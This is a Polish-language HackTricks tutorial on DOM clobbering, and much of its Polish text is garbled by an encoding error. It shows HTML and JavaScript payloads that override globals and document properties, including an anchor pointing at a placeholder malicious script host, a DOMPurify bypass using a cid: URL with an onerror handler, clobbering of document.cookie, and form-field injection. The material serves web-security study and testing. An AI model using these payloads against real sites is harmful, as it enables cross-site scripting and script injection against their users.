# Dom Clobbering

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmujcej si cyberbezpieczestwem**? Chcesz zobaczy swoj **firm reklamowan w HackTricks**? A mo偶e chcesz mie dostp do **najnowszej wersji PEASS lub pobra HackTricks w formacie PDF**? Sprawd藕 [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Docz do** [****](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** mnie na **Twitterze** [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Podstawy**

Mo偶liwe jest generowanie **globalnych zmiennych w kontekcie JS** za pomoc atrybut贸w **`id`** i **`name`** w tagach HTML.
```html
<form id=x></form>
<script> console.log(typeof document.x) //[object HTMLFormElement] </script>
```
**Tylko** okrelone elementy mog u偶ywa atrybutu **name** do nadpisania globalnych zmiennych, s to: `embed`, `form`, `iframe`, `image`, `img` i `object`.

Co ciekawe, gdy u偶ywasz elementu **formularza** do **nadpisania** zmiennej, otrzymasz warto **`toString`** tego elementu: `[object HTMLFormElement]`, ale z **anchor** warto **`toString`** bdzie wartoci atrybutu **`href`**. Dlatego, jeli nadpisujesz za pomoc znacznika **`a`**, mo偶esz **kontrolowa** warto, gdy jest **traktowana jako cig znak贸w**:
```html
<a href="controlled string" id=x></a>
<script>
console.log(x);//controlled string
</script>
```
### Tablice i atrybuty

Mo偶liwe jest r贸wnie偶 **nadpisanie tablicy** i **atrybut贸w obiektu**:
```html
<a id=x>
<a id=x name=y href=controlled>
<script>
console.log(x[1])//controlled
console.log(x.y)//controlled
</script>
```
Aby nadpisa **trzeci atrybut** (np. x.y.z), musisz u偶y **`formularza`**:
```html
<form id=x name=y><input id=z value=controlled></form>
<form id=x></form>
<script>
alert(x.y.z.value)//controlled
</script>
```
Nadpisywanie wikszej liczby atrybut贸w jest **bardziej skomplikowane, ale wci偶 mo偶liwe**, przy u偶yciu ramek (iframes):
```html
<iframe name=x srcdoc="<a id=y href=controlled></a>"></iframe>
<style>@import 'https://google.com';</style>
<script>alert(x.y)//controlled</script>
```
{% hint style="warning" %}
Tag style jest u偶ywany, aby **da wystarczajco du偶o czasu na renderowanie iframe**. Bez niego otrzymasz alert o **undefined**.
{% endhint %}

Aby nadpisa gbsze atrybuty, mo偶esz u偶y **iframe'贸w z kodowaniem HTML** w ten spos贸b:
```html
<iframe name=a srcdoc="<iframe srcdoc='<iframe name=c srcdoc=<a/id=d&amp;amp;#x20;name=e&amp;amp;#x20;href=\controlled&amp;amp;gt;<a&amp;amp;#x20;id=d&amp;amp;gt; name=d>' name=b>"></iframe>
<style>@import 'https://google.com';</style>
<script>
alert(a.b.c.d.e)//controlled
</script>
```
### **Ominicie filtr贸w**

Jeli filtr **ptli** przez **waciwoci** wza, u偶ywajc czego takiego jak `document.getElementByID('x').attributes`, mo偶esz **nadpisa** atrybut **`.attributes`** i **zama filtr**. Inne waciwoci DOM, takie jak **`tagName`**, **`nodeName`** lub **`parentNode`**, r贸wnie偶 s **nadpisywalne**.
```html
<form id=x></form>
<form id=y>
<input name=nodeName>
</form>
<script>
console.log(document.getElementById('x').nodeName)//FORM
console.log(document.getElementById('y').nodeName)//[object HTMLInputElement]
</script>
```
## **Nadpisywanie `window.someObject`**

W jzyku JavaScript czsto mo偶na znale藕:
```javascript
var someObject = window.someObject || {};
```
Manipulowanie HTML na stronie umo偶liwia nadpisanie `someObject` za pomoc wza DOM, co potencjalnie wprowadza podatnoci na bezpieczestwo. Na przykad, mo偶na zastpi `someObject` elementem kotwicy wskazujcym na zoliwy skrypt:
```html
<a id=someObject href=//malicious-website.com/malicious.js></a>
```
W podatnym kodzie, takim jak:
```html
<script>
window.onload = function(){
let someObject = window.someObject || {};
let script = document.createElement('script');
script.src = someObject.url;
document.body.appendChild(script);
};
</script>
```
Ta metoda wykorzystuje 藕r贸do skryptu do wykonania niechcianego kodu.

**Sztuczka**: **`DOMPurify`** pozwala na u偶ycie protokou **`cid:`**, kt贸ry **nie koduje podw贸jne cudzysowy w adresie URL**. Oznacza to, 偶e mo偶na **wstrzykn zakodowany podw贸jny cudzys贸w, kt贸ry zostanie zdekodowany w czasie wykonania**. Dlatego wstrzyknicie czego takiego jak **`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`** spowoduje, 偶e zakodowany HTML `&quot;` zostanie **zdekodowany w czasie wykonania** i **wydostanie si** z wartoci atrybutu, aby **utworzy** zdarzenie **`onerror`**.

Inna technika wykorzystuje element **`form`**. Niekt贸re biblioteki po stronie klienta sprawdzaj atrybuty nowo utworzonego elementu formularza w celu ich oczyszczenia. Jednak dodanie `input` z `id=attributes` wewntrz formularza skutecznie nadpisuje waciwo atrybut贸w, uniemo偶liwiajc dostp do rzeczywistych atrybut贸w przez oczyszczacz.

Mo偶esz [**znale藕 przykad tego rodzaju nadpisywania w tym opisie CTF**](iframes-in-xss-and-csp.md#iframes-in-sop-2).

## Nadpisywanie obiektu dokumentu

Zgodnie z dokumentacj mo偶liwe jest nadpisanie atrybut贸w obiektu dokumentu za pomoc DOM Clobbering:

> Interfejs [Document](https://html.spec.whatwg.org/multipage/dom.html#document) [obsuguje nazwane waciwoci](https://webidl.spec.whatwg.org/#dfn-support-named-properties). Obsugiwane nazwy waciwoci obiektu [Document](https://html.spec.whatwg.org/multipage/dom.html#document) w dowolnym momencie skadaj si z nastpujcych, w [kolejnoci drzewa](https://dom.spec.whatwg.org/#concept-tree-order) zgodnie z elementem, kt贸ry je dostarczy, ignorujc p贸藕niejsze duplikaty, a wartoci z atrybut贸w [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) pochodz przed wartociami z atrybut贸w name, gdy ten sam element dostarcza oba:
>
> \- Warto atrybutu name dla wszystkich [eksponowanych](https://html.spec.whatwg.org/multipage/dom.html#exposed) element贸w [embed](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element), [form](https://html.spec.whatwg.org/multipage/forms.html#the-form-element), [iframe](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element), [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) i [eksponowanych](https://html.spec.whatwg.org/multipage/dom.html#exposed) element贸w [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element), kt贸re maj niepusty atrybut name i s [w drzewie dokumentu](https://dom.spec.whatwg.org/#in-a-document-tree) z dokumentem jako [korzeniem](https://dom.spec.whatwg.org/#concept-tree-root);\
> \
> \- Warto atrybutu [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) dla wszystkich [eksponowanych](https://html.spec.whatwg.org/multipage/dom.html#exposed) element贸w [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element), kt贸re maj niepusty atrybut [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) i s [w drzewie dokumentu](https://dom.spec.whatwg.org/#in-a-document-tree) z dokumentem jako [korzeniem](https://dom.spec.whatwg.org/#concept-tree-root);\
> \
> \- Warto atrybutu [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) dla wszystkich element贸w [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element), kt贸re maj zar贸wno niepusty atrybut [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute), jak i niepusty atrybut name, i s [w drzewie dokumentu](https://dom.spec.whatwg.org/#in-a-document-tree) z dokumentem jako [korzeniem](https://dom.spec.whatwg.org/#concept-tree-root).

Za pomoc tej techniki mo偶na nadpisa powszechnie u偶ywane **wartoci, takie jak `document.cookie`, `document.body`, `document.children`**, a nawet metody w interfejsie Document, takie jak `document.querySelector`.
```javascript
document.write("<img name=cookie />")

document.cookie
<img name="cookie">

typeof(document.cookie)
'object'

//Something more sanitize friendly than a img tag
document.write("<form name=cookie><input id=toString></form>")

document.cookie
HTMLCollection(2)[img, form, cookie: img]

typeof(document.cookie)
'object
```
## Pisanie po zastpieniu elementu

Wyniki wywoa **`document.getElementById()`** i **`document.querySelector()`** mog by zmienione poprzez wstrzyknicie znacznika `<html>` lub `<body>` z identycznym atrybutem id. Oto jak to mo偶na zrobi:
```html
<div style="display:none" id="cdnDomain" class="x">test</div>
<p>
<html id="cdnDomain" class="x">clobbered</html>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
alert(document.querySelector('.x').innerText); // Clobbered
</script>
```
Ponadto, poprzez zastosowanie styl贸w do ukrycia wstrzyknitych tag贸w HTML/body, mo偶na zapobiec zak贸ceniom spowodowanym przez inne teksty w `innerText`, co zwiksza skuteczno ataku:
```html
<div style="display:none" id="cdnDomain">test</div>
<p>existing text</p>
<html id="cdnDomain">clobbered</html>
<style>
p{display:none;}
</style>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
Badania nad SVG wykazay, 偶e tag `<body>` mo偶e by r贸wnie偶 skutecznie wykorzystany:
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg><body id="cdnDomain">clobbered</body></svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
Aby tag HTML dziaa wewntrz SVG w przegldarkach takich jak Chrome i Firefox, konieczne jest u偶ycie tagu `<foreignobject>`:
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg>
<foreignobject>
<html id="cdnDomain">clobbered</html>
</foreignobject>
</svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
## Nadpisywanie formularzy

Mo偶liwe jest dodawanie **nowych wpis贸w do formularza** poprzez **okrelenie atrybutu `form`** wewntrz niekt贸rych tag贸w. Mo偶na to wykorzysta do **dodawania nowych wartoci do formularza** oraz do dodawania nowego **przycisku** do **jego wysania** (clickjacking lub nadu偶ycie kodu JS `.click()`):

{% code overflow="wrap" %}
```html
<!--Add a new attribute and a new button to send-->
<textarea form=id-other-form name=info>
";alert(1);//
</textarea>
<button form=id-other-form type="submit" formaction="/edit" formmethod="post">
Click to send!
</button>
```
{% endcode %}

* Aby uzyska wicej atrybut贸w formularza, sprawd藕 [**to**](https://www.w3schools.com/tags/tag\_button.asp)**.**

## Referencje

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
* [https://portswigger.net/web-security/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
* Heyes, Gareth. JavaScript dla haker贸w: Naucz si myle jak haker.

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Czy pracujesz w **firmie zajmujcej si cyberbezpieczestwem**? Chcesz zobaczy **reklam swojej firmy w HackTricks**? A mo偶e chcesz mie dostp do **najnowszej wersji PEASS lub pobra HackTricks w formacie PDF**? Sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Docz do** [****](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** mnie na **Twitterze** [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi trikami hakerskimi, przesyajc PR do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
